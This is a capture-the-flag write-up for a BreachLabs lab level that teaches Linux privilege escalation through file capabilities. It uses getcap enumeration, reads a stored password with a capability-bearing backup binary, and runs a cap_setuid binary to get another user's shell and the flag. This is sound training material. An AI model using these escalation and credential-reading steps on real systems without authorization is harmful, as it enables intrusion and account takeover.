# BreachLabs: Ghost Track II Level 02 - The Setuid That Wasn't

**Challenge:** Level 02  
**Date Completed:** September 1, 2026  
**Platform:** [BreachLabs](https://breachlab.org)

---

## Summary

The Setuid That Wasn't introduces capability-based privilege escalation as an alternative to SUID binaries. The challenge requires discovering executables with file capabilities rather than traditional setuid bits, then leveraging them to change user context. Success demonstrates understanding of the difference between SUID and capabilities, and how getcap reveals what traditional SUID hunts miss.

---

## Challenge Objective

**Goal:** Become the builder user and read `/home/builder/.flag`  
**Context:** Classic SUID hunt finds nothing; privilege escalation uses capabilities instead  
**Constraint:** Must identify and execute a binary with cap_setuid capability

---

## Initial Access

### Privilege Escalation from ghost2

Leveraged previous level's halcyon-backup binary to retrieve deploy user password:

```bash
./halcyon-backup /var/backups/.vault/deploy.secret
```

**Output:**
```
deploy account password: [REDACTED_PASSWORD]
```

### Deploy User Access

Switched to deploy user:

```bash
su deploy
```

**Finding:** Successfully became deploy user with password retrieved from vault.

---

## Challenge Brief

### Home Directory Inspection

Listed deploy user's home directory:

```bash
ls -alps
```

**Directory Contents:**
```
4 drwxr-x--- 2 deploy deploy 4096 Aug 22 16:14 ./
8 drwxr-xr-x 1 root   root   4096 Aug 22 16:14 ../
4 -rw-r--r-- 1 deploy deploy  220 Jan  6  2022 .bash_logout
4 -rw-r--r-- 1 deploy deploy 3771 Jan  6  2022 .bashrc
4 -rw-r--r-- 1 deploy deploy  807 Jan  6  2022 .profile
4 -rw------- 1 deploy deploy  740 Aug 22 16:14 kael.txt
```

**Finding:** Located challenge briefing in kael.txt.

### Challenge Briefing

Read the challenge briefing:

```bash
cat kael.txt
```

**Challenge Content:**
```
[ KAEL // fragment 2 ]
You are the deploy user now. Feels like more. You are still boxed in. Habit
says hunt for setuid binaries, so run the hunt. You will find nothing, and
that does not mean the box is clean. It means whoever hardened it moved the
same power somewhere the old tricks do not look. A helper on this box can
change who it runs as without ever being setuid root. Find it and use it.

  OBJECTIVE   Become the builder user and read /home/builder/.flag.
  SKILL       File capabilities versus SUID, and why find -perm -4000 lies.
  START HERE  When the classic setuid hunt comes up empty, ask what else on
              a Linux box can hand out an identity change. capsh and getcap
              see what the old hunt cannot.
```

**Finding:** Challenge indicates:
- Traditional SUID hunt will find nothing
- Must use capabilities instead
- getcap and capsh reveal what find -perm -4000 cannot
- A binary can change identity without setuid

---

## Capability Discovery

### Capability Enumeration

Used getcap to find all binaries with capabilities:

```bash
getcap -r / 2>/dev/null
```

**Getcap Output:**
```
/usr/bin/su cap_dac_read_search,cap_setgid,cap_setuid=ep
/usr/local/bin/hal-deploy-run cap_setgid,cap_setuid=ep
/usr/local/bin/halcyon-ping cap_net_raw=ep
/usr/local/bin/halcyon-web cap_net_bind_service=ep
/usr/local/bin/hal-runner-wrap cap_setuid=ep
/usr/local/bin/hal-guard cap_dac_override=ep
/usr/local/bin/halcyon-backup cap_dac_read_search=ep
```

**Finding:** Identified `/usr/local/bin/hal-deploy-run` with `cap_setgid,cap_setuid=ep` capabilities, allowing identity changes.

### Binary Directory Inspection

Examined /usr/local/bin to verify binary availability:

```bash
cd /usr/local/bin
ls -alps
```

**Directory Contents:**
```
996 -rwxr-x--- 1 root deploy 1016528 Aug 22 16:14 hal-deploy-run
812 -r-xr-x--- 1 ops  ops     827856 Aug 22 16:14 hal-guard
  4 -rwxr-xr-x 1 root root       476 Aug 22 16:14 hal-runner-loop
 16 -rwxr-x--- 1 root root     14472 Aug 22 16:14 hal-runner-wrap
812 -rwxr-xr-x 1 root root    827856 Aug 22 16:14 halcyon-backup
 28 -rwxr-xr-x 1 root root     26936 Aug 22 16:14 halcyon-ping
 28 -rwxr-xr-x 1 root root     26936 Aug 22 16:14 halcyon-web
```

**Finding:** hal-deploy-run not SUID (no 's' bit in permissions), but has setuid capability via getcap output. Deploy user can execute it.

---

## Privilege Escalation

### Binary Execution

Executed hal-deploy-run to trigger capability-based privilege escalation:

```bash
./hal-deploy-run
```

**Result:** Shell spawned as builder user.

### Identity Verification

Verified new user context:

```bash
whoami
```

**Output:**
```
builder
```

**Finding:** Successfully escalated to builder user through capability-based binary.

---

## Flag Retrieval

### Directory Navigation

Changed to builder home directory:

```bash
cd /home/builder/
```

### Flag Location

Listed directory contents:

```bash
ls -alps
```

**Directory Contents:**
```
4 drwxr-x--- 1 builder builder 4096 Sep  1 14:36 ./
8 drwxr-xr-x 1 root    root    4096 Aug 22 16:14 ../
4 -rw-r--r-- 1 builder builder  220 Jan  6  2022 .bash_logout
4 -rw-r--r-- 1 builder builder 3771 Jan  6  2022 .bashrc
4 -rw------- 1 builder builder   39 Sep  1 14:36 .flag
4 -rw-r--r-- 1 builder builder  807 Jan  6  2022 .profile
4 -rw------- 1 builder builder  926 Aug 22 16:14 kael.txt
```

**Finding:** Located `.flag` file (readable only by builder, as expected).

### Flag Reading

Read the flag file:

```bash
cat .flag
```

**Output:**
```
[REDACTED_FLAG]
```

**Finding:** Successfully retrieved flag after becoming builder user.

---

## Attack Chain Summary

```
Deploy User Access (via halcyon-backup from Level 01)
         ↓
Challenge Brief Discovery (kael.txt)
         ↓
Challenge Context (capabilities instead of SUID)
         ↓
Capability Enumeration (getcap -r /)
         ↓
Binary Analysis (/usr/local/bin/hal-deploy-run)
         ↓
Capability Identification (cap_setgid,cap_setuid=ep)
         ↓
Binary Directory Verification
         ↓
Binary Execution (./hal-deploy-run)
         ↓
Identity Change (capabilities trigger uid/gid change)
         ↓
Builder User Shell
         ↓
Directory Navigation (/home/builder)
         ↓
Flag File Location (.flag)
         ↓
Flag Retrieval 
         ↓
Challenge Complete
```

---

## Key Techniques & Concepts

1. **File Capabilities** — Permissions alternative to SUID, set per-executable
2. **getcap Command** — Reveals all binaries with capabilities system-wide
3. **cap_setuid Capability** — Allows binary to change process UID
4. **cap_setgid Capability** — Allows binary to change process GID
5. **=ep Notation** — Effective and Permitted capability flags
6. **Capability vs SUID** — Capabilities use getcap; SUID uses find -perm -4000
7. **Identity Change Without SUID** — Binaries without setuid bit can still change user
8. **Hardened System Design** — Capabilities offer more granular privilege control than SUID

---

## Tools & Commands Used

```bash
# Retrieve deploy password from vault
./halcyon-backup /var/backups/.vault/deploy.secret

# Switch to deploy user
su deploy

# List deploy home directory
ls -alps

# Read challenge briefing
cat kael.txt

# Enumerate system capabilities
getcap -r / 2>/dev/null

# Navigate to binary directory
cd /usr/local/bin

# List binaries
ls -alps

# Execute capability-based binary
./hal-deploy-run

# Verify current user
whoami

# Navigate to builder home
cd /home/builder/

# List builder directory
ls -alps

# Read flag file
cat .flag
```

---

## Lessons Learned

1. **Capabilities Advantage** — Provide granular privilege delegation vs all-or-nothing SUID
2. **getcap Discovery** — Essential tool for identifying capability-based privilege escalation
3. **SUID Limitations** — Traditional hunts miss binaries using capabilities
4. **Modern Hardening** — Systems using capabilities are harder to compromise via classic SUID attacks
5. **Binary Analysis** — Not all privilege escalation vectors visible in file permissions
6. **Capability Abuse** — Improper cap_setuid/cap_setgid grants unintended access
7. **Layered Exploitation** — Each level uses previous level's credentials to progress

---

## References

- BreachLabs: [Ghost Track II Series](https://breachlab.org)
- Linux Capabilities: Manual pages for capabilities(7)
- getcap: Manual pages for getcap(8)

---

**Status:** ✅ Completed  
**Challenge Type:** Capability-Based Privilege Escalation  
**Key Learning:** Using file capabilities (getcap) to identify and exploit privilege escalation vectors invisible to traditional SUID hunts
